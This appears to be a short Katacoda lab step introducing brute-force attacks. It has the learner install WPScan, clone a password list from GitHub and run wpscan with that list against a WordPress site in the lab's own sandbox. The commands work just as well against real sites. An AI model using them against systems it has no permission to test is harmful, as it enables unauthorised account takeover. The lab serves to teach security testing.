### **3. Introduction Brute-Force Attack**
---

### **What is Brute-force attack?**
```
Brute-force attack means the attacker submits a huge number of passwords or usernames to guess the username and password correctly. 
```
#### Now let try to enforce the brute-force attack to the WordPress website we have just created.
<br></br>
### Step 1:
#### Download the WPscan using the command:

`gem install wpscan`{{execute}}
### Step 2:
#### Clone the crack.txt file which includes a list of password from Github using the command:
`git clone https://github.com/tonywong586/CrackList.git`{{execute}}
<br></br>
access the CrackList file using the following command:

`cd CrackList`{{execute}}
<br></br>
### Step 4:
#### Use the following command to enforce the Brute-force attack
`
wpscan --url https://[[HOST_SUBDOMAIN]]-8000-[[KATACODA_HOST]].environments.katacoda.com --passwords crack.txt
`{{execute}}

